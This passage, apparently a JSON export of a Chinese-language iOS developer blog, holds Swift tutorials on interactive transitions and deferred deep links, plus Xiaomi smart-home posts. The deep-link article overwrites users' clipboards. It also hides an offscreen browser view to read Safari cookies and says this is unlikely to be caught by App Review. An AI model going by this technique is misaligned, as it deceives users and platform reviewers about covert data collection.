interactiveView: UIView! private var presented: UIViewController! private var completion:(() -&gt; Void)? private let thredhold: CGFloat = 0.4 convenience init(_ presented: UIViewController, _ interactiveView: UIView,_ completion:(() -&gt; Void)? = nil) { self.init() self.interactiveView = interactiveView self.completion = completion self.presented = presented setupPanGesture() wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 panGesture.delegate = self interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: sender.setTranslation(.zero, in: interactiveView) wantsInteractiveStart = true self.presented.dismiss(animated: true, completion: self.completion) case .changed: let translation = sender.translation(in: interactiveView) guard translation.y &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.y / interactiveView.bounds.height) update(percentage) case .ended: if percentComplete &gt;= thredhold { finish() } else { wantsInteractiveStart = false cancel() } case .cancelled, .failed: wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}extension PullToDismissInteractive: UIGestureRecognizerDelegate { func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -&gt; Bool { if let scrollView = otherGestureRecognizer.view as? UIScrollView { if scrollView.contentOffset.y &lt;= 0 { return true } else { return false } } return true } }以上就能達到如圖的效果，這邊因教學展示不想弄的路太複雜，所以程式碼很醜，還有很多優化整合的空間。 值得一提的是… iOS ≥ 13，如果遇到 View 內容有 UITextView，在做下拉關閉動畫時，動畫當中 UITextView 的文字內容會一片空白；造成體驗會閃一下 (影片範例) … 這邊的解決方案是在做動畫時用 snapshotView(afterScreenUpdates:) 截圖取代原本的 View 圖層。全頁右滑返回在尋找全畫面都能手勢右滑返回的解決方案時，找到個 Tricky 的方法：直接在畫面上加一個 UIPanGestureRecognizer 然後將 target 、 action 都指定到原生的 interactivePopGestureRecognizer ， action:handleNavigationTransition 。*詳細方法點我&lt;沒錯！看起來就很 Private API，感覺審核會被拒；而且不確定 Swift 是否可用，應該有用到 OC 才有的 Runtime 特性。還是走正規的吧：ㄧ樣使用本篇的方式，我們在 navigationController POP 返回時自行處理；添加一個全頁右滑手勢控制配合自訂右滑動畫，即可！其他省略，只貼關鍵的動畫跟交互處理類別：import UIKitclass SwipeBackInteractive: UIPercentDrivenInteractiveTransition { private var interactiveView: UIView! private var navigationController: UINavigationController! private let thredhold: CGFloat = 0.4 convenience init(_ navigationController: UINavigationController, _ interactiveView: UIView) { self.init() self.interactiveView = interactiveView self.navigationController = navigationController setupPanGesture() wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: sender.setTranslation(.zero, in: interactiveView) wantsInteractiveStart = true self.navigationController.popViewController(animated: true) case .changed: let translation = sender.translation(in: interactiveView) guard translation.x &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.x / interactiveView.bounds.width) update(percentage) case .ended: if percentComplete &gt;= thredhold { finish() } else { wantsInteractiveStart = false cancel() } case .cancelled, .failed: wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}上拉漸入 UIViewController在View上上拉漸入＋下拉關閉，就是在做類似 Spotify 的播放器轉場效果了！這部分較為繁瑣，但原理一樣，這邊就不 PO 出來了，有興趣的朋友可參考 GitHub 範例內容。要說哪裡要注意，大概就是 在上拉漸入時，動畫要確保是使用「.curveLinear 線性」否則會出現上拉不跟手的問題 ；拉的程度跟顯示的位置不是正比。完成！完成圖 此篇很長，也花了我許久時間整理製作，感謝您的耐心閱讀。全篇 GitHub 範例下載：參考資料： Draggable view controller? Interactive view controller! 系统学习iOS动画之四：视图控制器的转场动画 系统学习iOS动画之五：使用UIViewPropertyAnimator 用UIPresentationController来写一个简洁漂亮的底部弹出控件 (單純只做Present 動畫效果可直接用這個)若需要參考優雅的程式碼封裝使用： Swift: https://github.com/Kharauzov/SwipeableCards Objective-C: https://github.com/saiday/DraggableViewControllerDemo有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 6,715 Total Views Last Statistics Date: 2025-01-19 | 6,536 Views on Medium. " }, { "title": "iOS Deferred Deep Link 延遲深度連結實作(Swift)", "url": "/posts/b08ef940c196/", "categories": "ZRealm Dev.", "tags": "deeplink, ios-app-development, swift, universal-links, app-store", "date": "2019-11-11 22:34:57 +0800", "snippet": "iOS Deferred Deep Link 延遲深度連結實作(Swift)動手打造適應所有場景、不中斷的App轉跳流程[2022/07/22] 更新 iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy chang...", "content": "iOS Deferred Deep Link 延遲深度連結實作(Swift)動手打造適應所有場景、不中斷的App轉跳流程[2022/07/22] 更新 iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy change in iOS 16[2020/07/02] 更新 因應 iOS 14 更新，讀取剪貼簿時會提示使用者，如要實作請一併參考此篇文章。無關畢業當完兵到現在庸庸碌碌工作了快三年，成長已趨於平緩，開始進入舒適圈，所幸心一橫提了離職，沈澱重新出發。在閱讀 做自己的生命設計師 重新梳理自己的人生規劃時，回顧了一下工作跟人生，雖然本身技術能力沒有很好，但在寫 Medium 與大家分享能讓我進入「心流」跟獲得大量的精力；剛好前陣子有朋友在問 Deep Link 問題，藉此整理了我研究的做法，也順便補充下自己的精力！場景首先要先說明實際應用場景。1.當使用者有裝 APP 時點擊網址連結(Google搜尋來源、FB貼文、Line連結…) 則直接開 APP 呈現目標畫面，若無則跳轉到 APP Store 安裝 APP； 安裝完後打開APP，要能重現之前欲前往的畫面 。2.APP 下載和開啟數據追蹤，我們想知道 APP 推廣連結有多少人確實從這個入口下載和開啟 APP 的。3.特殊活動入口，例如透過特定網址下載後開啟能獲得獎勵。支援度：iOS ≥ 9何謂 Deferred Deep Link 與 Deep Link 的差別？純 Deep Link 本身：可以看到 iOS Deep Link 本身運作機制只有判斷 APP 有無安裝，有則開 APP，無則不處理．首先我們要先加上「無則跳轉到 APP Store」提示使用者安裝 APP：URL Scheme 的部分是由系統控制，一般用於 APP 內呼叫鮮少公開出來；因為如果觸發點在自己無法控制的區域(如：Line連結)，則無法處理。若觸發點在自身網頁上可以使用些小技巧處理，請參考 這裡 ：&lt;html&gt;&lt;head&gt; &lt;title&gt;Redirect...&lt;/title&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;script&gt; var appurl = 'marry://open'; var appstore = 'https://apps.apple.com/tw/app/%E7%B5%90%E5%A9%9A%E5%90%A7-%E6%9C%80%E5%A4%A7%E5%A9%9A%E7%A6%AE%E7%B1%8C%E5%82%99app/id1356057329'; var timeout; function start() { window.location = appurl; timeout = setTimeout(function(){ if(confirm('馬上安裝結婚吧APP?')){ document.location = appstore; } }, 1000); } window.onload = function() { start() } &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;大略邏輯是 一樣呼叫 URL Scheme，然後設個 Timeout，時間到若還在本頁沒跳轉就當沒安裝 Call 不到 Scheme，轉而導 APP Store 頁面 (但體驗還是不好還是會跳網址錯誤提示，只是多了自動轉址)。Universal Link 本身就是個自己的網頁，若無跳轉，預設就是使用網頁瀏覽器呈現，這邊有網頁服務的可以選擇直接跳網頁瀏覽、沒有的就直接導 APP Store 頁面。有網頁服務的網站可以在 &lt;head&gt;&lt;/head&gt; 中加入：&lt;meta name=\"apple-itunes-app\" content=\"app-id=APPID, app-argument=頁面參數\"&gt;使用 iPhone Safari 瀏覽網頁版上方就會出現 APP 安裝提示、使用 APP 開啟本頁的按鈕； 參數 app-argument 就是用來帶入頁面值，並傳遞到 APP 用的。加上「無則跳轉到 APP Store」的流程圖完善 Deep Link APP 端處理：我們要的當然不只是「當使用者有安裝 APP 則開啟 APP」，我們還要將來源資訊與 APP 串起，讓 APP 開啟後自動呈現目標頁面的 APP 畫面。URL Scheme 方式可在 AppDelegate 中的 func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool 進行處理：func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool { if url.scheme == \"marry\",let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID:params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC,animated: true) } } return true}Universal Link 則是在 AppDelegate 中的 func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool 進行處理：extension URL { /// test=1&amp;a=b&amp;c=d =&gt; [\"test\":\"1\",\"a\":\"b\",\"c\":\"d\"] /// 解析網址query轉換成[String: String]數組資料 public var queryParameters: [String: String]? { guard let components = URLComponents(url: self, resolvingAgainstBaseURL: true), let queryItems = components.queryItems else { return nil } var parameters = [String: String]() for item in queryItems { parameters[item.name] = item.value } return parameters } }先附上一個 URL 的擴充方法 queryParameters，用於方便將 URL Query 轉換成 Swift Dictionary。func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool { if userActivity.activityType == NSUserActivityTypeBrowsingWeb, webpageURL = userActivity.webpageURL { /// 如果是universal link url來源... let params = webpageURL.queryParameters if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID:params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC,animated: true) } } return true }完成！那還缺什麼？目前看來已經很完美了，我們處理了所有會遇到的狀況，那還缺什麼？如圖所示，如果是 未安裝 -&gt; APP Store 安裝 -&gt; APP Store 打開，來源所帶的資料就會中斷，APP 不知道來源所以就只會顯示首頁；使用者要再回到上一步網頁再點一次開啟，APP 才會驅動跳頁。 雖然這樣也不是不行，但考慮到跳出流失率，多一個步驟就是多一層流失，還有使用者體驗起來不順暢；更何況使用者未必這麼聰明。進入本文重點何謂 Deferred Deep Link？，延遲深度連結；就是讓我們的 Deep Link 可以延伸到 APP Store 安裝完後依然保有來源資料。據 Android 工程師表示 Android 本身就有此功能，但在 iOS 上並不支援此設定、要達到此功能的做法也不友善，請繼續看下去。Deferred Deep Link 如果不想花時間自己做的話可以直接使用 branch.io 或 Firebase Dynamic Links 本文介紹的方法就是 Firebase 使用的方式。要達成 Deferred Deep Link 的效果網路上有兩種做法：一種是透過使用者裝置、IP、環境…等等參數計算出一個雜湊值，在網頁端存入資料到伺服器；當 APP 安裝後打開用同樣方式計算，如果值相同則取出資料恢復（branch.io 的做法）。另一種是本文要介紹的方法，同 Firebase 作法；使用 iPhone 剪貼簿和 Safari 與 APP Cookie 共享機制的方法，等於是把資料存在剪貼簿或Cookie，APP安裝完成後再去讀出來使用。點擊「Open」後你的剪貼簿就會被 JavaScript 自動覆蓋複製上跳轉相關資訊：https://XXX.app.goo.gl/?link=https://XXX.net/topicID=1&amp;type=topic相信有套過 Firebase Dynamic Links 的人一定不陌生這個開啟跳轉頁，了解到原理之後就知道這頁在流程中是無法移除的！另外 Firebase 也不提供進行樣式修改。支援度首先講個坑，支援度問題；如前所說的「不友善」！如果 APP 只考慮 iOS ≥ 10 以上的話容易許多，APP 實作剪貼簿存取、Web 使用 JavaScript 將資訊覆蓋到剪貼簿，然後再跳轉到 APP Store 導下載就好。iOS = 9 不支援JavaScript自動剪貼簿但支援 Safari 與 APP SFSafariViewController「Cookie 互通大法」另外在 APP 需要偷偷在背景加入 SFSafariViewController 載入 Web，再從 Web 取得剛才點連結時存的Cookie資訊。 步驟繁瑣＆連結點擊僅限 Safari瀏覽器。SFSafariViewController 根據官方文件，iOS 11 已無法取得使用者的 Safari Cookie，若有這方面需求可使用 SFAuthenticationSession，但此方法無法在背景偷執行，每次載入前都會跳出以下詢問視窗：SFAuthenticationSession 詢問視窗 還有就是 APP審查是不允許將SFSafariViewController放在使用者看不到的地方的。(用程式觸發再 addSubview 不太容易被發現)動手做先講簡單的，只考慮 iOS ≥ 10 以上的用戶，單純使用 iPhone 剪貼簿轉傳資訊。Web 端：我們仿造 Firebase Dynamic Links 客製化刻了自己的頁面，使用 clipboard.js 這個套件讓使用者點擊「立即前往」時先將我們要帶給 APP 的資訊複製到剪貼簿 （marry://topicID=1&amp;type=topic） ，然後再使用 location.href 跳轉到 APP Store 商城頁。APP 端：在 AppDelegate 或 主頁 UIViewController 中讀取剪貼簿的值：let pasteData = UIPasteboard.general.string這邊建議還是將資訊使用 URL Scheme 方式包裝，方便進行辨識、資料反解：if let pasteData = UIPasteboard.general.string,let url = URL(string: pasteData),url.scheme == \"marry\",let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID:params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC,animated: true) }}最後在處理完動作後使用 UIPasteboard.general.string = “” 將剪貼簿中的資訊清除。動手做 — 支援 iOS 9 版本麻煩的來了，支援 iOS 9 版，前文有說由於不支援剪貼簿，要使用 Cookie 互通大法 。Web 端：web 端也算好處理，就是改成使用者點擊「立即前往」時將我們要帶給 APP 的資訊存到 Cookie （marry://topicID=1&amp;type=topic） ，然後再使用 location.href 跳轉到 APP Store 商城頁。這裡提供兩個封裝好的 JavaScript 處理 Cookie 的方法，加速開發：/// name: Cookie 名稱/// val: Cookie 值/// day: Cookie 有效期限，預設１天/// EX1: setcookie(\"iosDeepLinkData\",\"marry://topicID=1&amp;type=topic\")/// EX2: setcookie(\"hey\",\"hi\",365) = 一年有效function setcookie(name, val, day) { var exdate = new Date(); day = day || 1; exdate.setDate(exdate.getDate() + day); document.cookie = \"\" + name + \"=\" + val + \";expires=\" + exdate.toGMTString();}/// getCookie(\"iosDeepLinkData\") =&gt; marry://topicID=1&amp;type=topicfunction getCookie(name) { var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\")); if (arr != null) return decodeURI(arr[2]); return null;}APP 端：本文最麻煩的地方來了。前文有提到原理，我們要在主頁的UIViewController用程式偷偷加載一個SFSafariViewController 在背景不讓使用者察覺。再說個坑： 偷偷加載這件事，iOS ≥ 10 SFSafariViewController 的 View如果大小設定小於1、透明度小於0.05、設成 isHidden，SFSafariViewController 就 不會載入 。 p.s iOS = 10 同時支援 Cookie 及 剪貼簿。https://stackoverflow.com/questions/39019352/ios10-sfsafariviewcontroller-not-working-when-alpha-is-set-to-0/39216788我這邊的做法是在 主頁的UIViewController 上方放一個 UIView 隨便給個高度，但底部對齊 主頁面 UIView 上方，然後拉 IBOutlet （sharedCookieView） 到 Class；在 viewDidLoad( ) 時 init SFSafariViewController 並將其 View 加入到 sharedCookieView 上，所以他實際有顯示有載入，只是跑出畫面了，使用者看不到🌝。SFSafariViewController 的 URL 該指向？同 Web 端分享頁面，我們要再刻一個 For 讀取 Cookie 的頁面，並將兩個頁面放在同個網域之下避免跨網域Cookie問題，頁面內容稍後附上。@IBOutlet weak var SharedCookieView: UIView!override func viewDidLoad() { super.viewDidLoad() let url = URL(string:\"http://app.marry.com.tw/loadCookie.html\") let sharedCookieViewController = SFSafariViewController(url: url) VC.view.frame = CGRect(x: 0, y: 0, width: 200, height: 200) sharedCookieViewController.delegate = self self.addChildViewController(sharedCookieViewController) self.SharedCookieView.addSubview(sharedCookieViewController.view) sharedCookieViewController.beginAppearanceTransition(true, animated: false) sharedCookieViewController.didMove(toParentViewController: self) sharedCookieViewController.endAppearanceTransition()}sharedCookieViewController.delegate = selfclass HomeViewController: UIViewController, SFSafariViewControllerDelegate需要加上這個 Delegate 才能捕獲載入完成後的 CallBack 處理。我們可以在：func safariViewController(_ controller: SFSafariViewController, didCompleteInitialLoad didLoadSuccessfully: Bool) {方法中捕獲載入完成事件。到這步，你可能會想再來就是在 didCompleteInitialLoad 中讀取 網頁內的 Cookie 就完成了！在這裡我沒找到讀取 SFSafariViewController Cookie 的方法，使用網路的方法讀出來都是空的。 或可能要使用 JavaScript 與頁面內容進行交互，叫 JavaScript 讀 Cookie 回傳給 UIViewController。Tricky 的 URL Scheme 法既然 iOS 不知到如何取得共享的 Cookie，那我們就直接交由「讀取 Cookie 的頁面」去幫我們「讀取 Cookie」。前文附上的 JavaScript 處理 Cookie 的方法中的 getCookie( ) 就是用在這，我們的「讀取 Cookie 的頁面」內容是個空白頁(反正使用者看不到)，但是在 JavaScript 部分要在 body onload 之後去讀取 Cookie：&lt;html&gt;&lt;head&gt; &lt;title&gt;Load iOS Deep Link Saved Cookie...&lt;/title&gt; &lt;script&gt; function checkCookie() { var iOSDeepLinkData = getCookie(\"iOSDeepLinkData\"); if (iOSDeepLinkData &amp;&amp; iOSDeepLinkData != '') { setcookie(\"iOSDeepLinkData\", \"\", -1); window.location.href = iOSDeepLinkData; /// marry://topicID=1&amp;type=topic } } &lt;/script&gt;&lt;/head&gt;&lt;body onload=\"checkCookie();\"&gt;&lt;/body&gt;&lt;/html&gt;實際的原理總結就是：在 HomeViewController viewDidLoad 時加入 SFSafariViewController 偷加載 loadCookie.html 頁面， loadCookie.html 頁面讀取檢查先前存的 Cookie，若有則讀出清除，然後使用 window.location.href 呼叫，觸發 URL Scheme 機制。所以之後對應的 CallBack 處理就會回到 AppDelegate 中的 func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool 進行處理。完工！總結：如果覺得煩瑣，可以直接使用 branch.io 或 Firebase Dynamic 沒必要重造輪子，這邊是因為介面客製化及一些複雜需求，只好自己打造。iOS=9 的用戶已經非常稀少，不是很必要的話可以直接忽略；使用剪貼簿的方法快又有效率，而且用剪貼簿就不用局限連結一定要用 Safari 開啟！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 20,314 Total Views Last Statistics Date: 2025-01-19 | 20,168 Views on Medium. " }, { "title": "iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居", "url": "/posts/21119db777dd/", "categories": "ZRealm Life.", "tags": "米家, ios-13, siri, siri-shortcut, 生活", "date": "2019-09-26 22:23:36 +0800", "snippet": "iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作前言今年 7 月初的時候買了米家檯燈 Pro、米家 LED 智慧檯燈兩個智能設備，差別在一個能支援HomeKit，一個僅支援米家；當時寫了篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」文章，裡面提到如何在沒有 HomePod/AppleTV...", "content": "iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作前言今年 7 月初的時候買了米家檯燈 Pro、米家 LED 智慧檯燈兩個智能設備，差別在一個能支援HomeKit，一個僅支援米家；當時寫了篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」文章，裡面提到如何在沒有 HomePod/AppleTV/iPad 下完成離家、到家兩種模式的智慧功能，步驟有點麻煩。這次 iOS ≥13.1 (注意是 13.1 之後才開放)，內建的「 捷徑 」APP ( 若找不到請從 Store 下載回來) 支援自動化功能；如果 IFTTT、米家米家智慧，只是現在不用再特別使用第三方APP囉！ p.s 如果你有HomePod、apple tv、iPad 完全不用看這篇文章；可以直接把設備設成家庭中樞即可！達成效果進入、離開設定區域會收到捷徑執行通知，點擊後會自動執行。如何使用1.先打開米家APP切換到「我的」-&gt;「智慧」 這裡假設你已經把設備加入米家了。選擇「手動執行」 這裡再提一下為什麼不直接用米家的「離開或到達某地」，第一是 大陸用的GPS有偏移 小米沒針對此修正，第二是他只能設定地圖上有地標的地點，他是大陸高德地圖很少台灣地標。下拉「智慧裝置」區塊，新增要操作的裝置及動作點擊「繼續增加」加入所有要操作的設備範例以「離家」模式為例，離家時我希望能關閉風扇、燈；打開攝影機。點擊右上角「儲存」，輸入此智慧操作的名稱回到列表，點「加入 Siri 」點擊要加入的智慧操作旁的「加入 Siri 」輸入「呼叫Siri 時的指令」-&gt; 「Add to Siri」這邊要注意！ 指令不可以與 iOS 內建指令衝突！2.打開 「 Siri捷徑 」 APP切換到「自動化」頁籤，點擊右上角「+」 若沒有「自動化」頁籤請確認您的 iOS 版本是否高於 13.1。選擇「製作個人自動化操作」選擇類型「抵達」或「離開」設定「位置」搜尋位置或使用當前位置，點「完成」下方可設定自動執行時間範圍，點右上角「下一步」因為離家、到家是全天候都要偵測的事件；所以這邊就不設會執行的時間範圍了！點選「加入動作」選擇「工序指令」滑到「捷徑」區塊，選擇「執行捷徑」點選「捷徑」區塊找到剛在米家「加入 Siri」設定的「呼叫Siri 時的指令」，選擇點右上角「完成」首頁就會出現剛新增的自動化操作囉！完成！實際執行結果當離開、進入設定地址的範圍時，手機、Apple Watch 就會收到執行捷徑的動作通知，點擊即可執行！ 1.GPS感應範圍存在 100 公尺誤差 2. 所謂「自動化」只是自動通知你按執行 ，不是真的自動在背景執行動作 以上兩個痛點要解決就只能用文章開頭所說的，買一台HomePod或是找一台 apple tv/iPad 當家庭中樞。iPhone上 :執行通知點擊即可「執行」請注意，會要求解鎖手機後才能。執行失敗也會反饋！有時候米家設備網路問題會執行失敗。Apple Watch 上：點擊即可執行不同於 IFTTT 原生內建 APP 的強大就在於它手錶上的通知也能執行。(IFTTT的是純通知，還是要拿手機出來點執行)除此之外使用 Siri 呼叫執行因為已將米家智慧操作場景加入到 Siri 了，所以也可以呼叫 Siri 執行動作！ 離智能生活又更近一步了！延伸閱讀 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 （米家智慧攝影機及米家智慧檯燈、Homekit設定教學） 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） 米家 APP / 小愛音箱地區問題 [進階篇]示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 17,100 Total Views Last Statistics Date: 2025-01-19 | 15,902 Views on Medium. " }, { "title": "小米智慧家居新添購", "url": "/posts/bcff7c157941/", "categories": "ZRealm Life.", "tags": "小米, 米家, 生活, 家電, 開箱", "date": "2019-09-26 21:16:42 +0800", "snippet": "小米智慧家居新添購AI音箱、溫濕度感應器、體重計2、直流變頻電風扇 使用心得入坑既上一篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」入手&amp;介紹如何使用小米智慧家居後；又持續買了幾樣小米居家產品，並且想盡辦法讓所有家電都智慧化….只能說真的是個坑，起初只是想買個檯燈覺得小米美美的，順帶研究了智慧功能，就這樣入坑了！新添購 — 小米AI音箱價格：NT$ 1...", "content": "小米智慧家居新添購AI音箱、溫濕度感應器、體重計2、直流變頻電風扇 使用心得入坑既上一篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」入手&amp;介紹如何使用小米智慧家居後；又持續買了幾樣小米居家產品，並且想盡辦法讓所有家電都智慧化….只能說真的是個坑，起初只是想買個檯燈覺得小米美美的，順帶研究了智慧功能，就這樣入坑了！新添購 — 小米AI音箱價格：NT$ 1,495特色： 可語音控制米家所有串連的智慧設備 台灣地區送 KKBOX 會員 3 個月 語音智能強大；跟 Siri 比起來，Siri = 3歲小孩¶小愛同學除了有基本的語音助理功能（查天氣、新聞、資料、控制家電、播音樂….）¶還有超多擴充的技能（問美劇、玩小遊戲、聊天、講相聲、 扮女僕，沒錯就是用女僕口吻跟你對話！！ ）¶支援自訂功能（自訂詞、對應的動作） 另外差別最大的是他比較會舉一反三，不像 Siri 你問他天氣他也就只回妳天氣就沒了；小愛同學會順帶問你要不要提醒你帶傘之類的，更貼心有溫度。 360 度收音、放音，音量很夠；呼叫也很靈敏準確。 可直接當藍芽音樂播放音箱缺點： 當藍牙音響時 ，看影片會有1–2秒嚴重延遲；這算是蠻嚴重的缺陷，查大陸論壇也無解決辦法，官方擺爛，貌似是硬體問題。 不支援 Spotify / Apple Music ，像我非 KKBOX 用戶，送的 3 個月到期後不想花錢就只能切到大陸地區使用 QQ 音樂。 不像 HomePod 支援家庭中樞功能，本來我預期的是可以把小米音箱當智慧家庭的中樞中心，然後我到家，米家感應到小米音箱就能自動執行對應的動作（就是蘋果HomePod+HomeKit那套）；看來是不行！ 要另外裝一個 小愛音箱 APP 跟米家APP要設同個地區，我米家APP設在大陸(因功能較多)，小愛同學也只能設大路綜合上述，日常使用下就只是個只能播音樂的藍牙音箱，偶爾叫小愛同學時間到叫我…就這樣，其實 Siri 就能做到；無法當電腦的藍牙音響對我來說真的很痛，但不得不說他的語音功能真的很智慧、很厲害！可以買來玩玩。新添購 — 米家藍牙溫濕度計小物，NT$ 365要另外再買一顆4號電池來裝；官方號稱續航可達一年，外觀圓形小巧、磁掛式設計隨時拿下來把玩都很方便，雙排顯示螢幕能快速掌握目前溫度及濕度。APP 溫度紀錄僅支援藍牙連線，所以手機超過藍牙範圍後就無法讀取到數據；除非購買藍芽網關或是支援藍芽網關功能的其他米家設備。官方文件的支援藍芽網關設備列表一般來說是能連WiFi跟藍牙的設備都支援，但 小米AI音箱居然不行 ！！而且我發現一件神奇的事，就是 米家直流變頻電風扇居然可以 ，WTF! ! ! !；所以我目前是透過米家電風扇把溫濕度計的訊息用WiFi傳到網路給我。真的很詭異．．．小米AI音箱、檯燈、桌燈、攝影機都不支援藍芽網關功能，電風扇居然支援！ *不確定是否是只有溫濕度計能這樣另外補充溫濕度計會不一直發推播通知推播溫度太高或太潮濕的消息（但台灣這些溫濕度是很正常的…）關閉方式：可以到「我的」-&gt; 右上角「設定」-&gt; 裝置通知 -&gt; 找到米家藍芽溫濕度計 -&gt; 關閉關閉之後就不會再收到推播通知消息了！新添購 — 體重計2就是個體重計，NT$ 395除了能APP記錄體重外多了秤物、平衡測試…功能，但就是體重計，比較常用的就是量體重而已；外型精美，放在家裡不用也能提升質感！體重計也要另外下載一個小米健康的APP，在秤重時打開APP就能同步紀錄體重。小米健康APP新添購 — 直流變頻電風扇這次設備添購中最滿意的電器，NT$ 1995首先電風扇的基本功能方面左右擺角120度範圍很大，風力調節支援1–100段，風力大小隨心所欲；我最喜歡的是另一個「自然風」模式，因為我怕熱喜歡直吹但很常直吹一陣子之後覺得不太舒服，這個自然風可以讓我一直保持直吹模式，不會不舒服！外觀設計ㄧ樣保持小米白色簡潔的設計，我個人不喜歡電扇太金屬(感覺就髒髒的)；小米電扇很輕盈乾淨，沒用放著，看也舒服。智能方面加入米家APP之後，可以從APP控制所有參數(模式、開關、風力、角度)；另外也可以設定週期定時(EX:週一～週五早上7:00關閉)、與米家設備連動(EX:回家自動打開、溫度高於30度自動打開)…等等智慧家居功能可以玩另外就是發現它能當藍芽網關，幫米家藍牙溫濕度計傳輸數據。 *不確定是否是只有溫濕度計能這樣目前已有設備整理 米家智慧攝影機雲台版 1080P (支援：米家) 米家檯燈 Pro (支援：Apple HomeKit、米家) 米家 LED 智慧檯燈 (支援：米家) 小米AI音箱 米家藍芽溫濕度感應器 小米體重計2 米家直流變頻電風扇總結以上就是這次新添購項目心得整理，距離理想（溫度太高自動開冷氣、電風扇跟人、回家開燈、離家關燈開攝影機、濕度太高開除濕機）還有很常的路要走，甚至非常崎嶇…要會改電路、還有發現我的除濕機是沒有回歸功能、冷氣也是舊型；米家很多設備台灣也沒賣(EX:萬能遙控器)，本來想衝智慧家庭組，但想想用途不大，目前繼續研究還有啥能上智能！延伸閱讀 智慧家居初體驗 — Apple HomeKit &amp; 小米米家（米家智慧攝影機及米家智慧檯燈、Homekit設定教學） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） 米家 APP / 小愛音箱地區問題 [進階篇]示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,185 Total Views Last Statistics Date: 2025-01-19 | 1,150 Views on Medium. " }, { "title": "iPlayground 2019 是怎麼樣的體驗？", "url": "/posts/4079036c85c2/", "categories": "ZRealm Dev.", "tags": "iplayground, iplayground2019, ios-app-development, swift, taiwan-ios-conference", "date": "2019-09-22 21:47:18 +0800", "snippet": "iPlayground 2019 是怎麼樣的體驗？iPlayground 2019 火熱熱參加心得關於活動去年辦在10月中，我也是去年10月初才開始經營 Medium 記錄生活；結合聽到的 UUID 議題跟參加心得也寫了篇 文章 ；今年繼續來 寫心得蹭熱度 ！iPlayground 2019 (本次一樣是由 公司 補助企業票)相較 2018 年第一屆，今年在各方面又更大幅度提升！首先是場地部...", "content": "iPlayground 2019 是怎麼樣的體驗？iPlayground 2019 火熱熱參加心得關於活動去年辦在10月中，我也是去年10月初才開始經營 Medium 記錄生活；結合聽到的 UUID 議題跟參加心得也寫了篇 文章 ；今年繼續來 寫心得蹭熱度 ！iPlayground 2019 (本次一樣是由 公司 補助企業票)相較 2018 年第一屆，今年在各方面又更大幅度提升！首先是場地部分 ，去年在地下一樓會議廳，活動空間不大頗有壓迫感、講座教室用電腦不易；今年直接拉到台大博雅館舉辦，場地很大很新不會人擠人、教室有桌子/插座，方便使用個人電腦！議程方面 ，除了國內的大大，這次也廣邀國外講者來台分享；其中高朋滿座的絕非貓神 王巍(Wei Wang) 莫屬；今年也首次加入 workshop 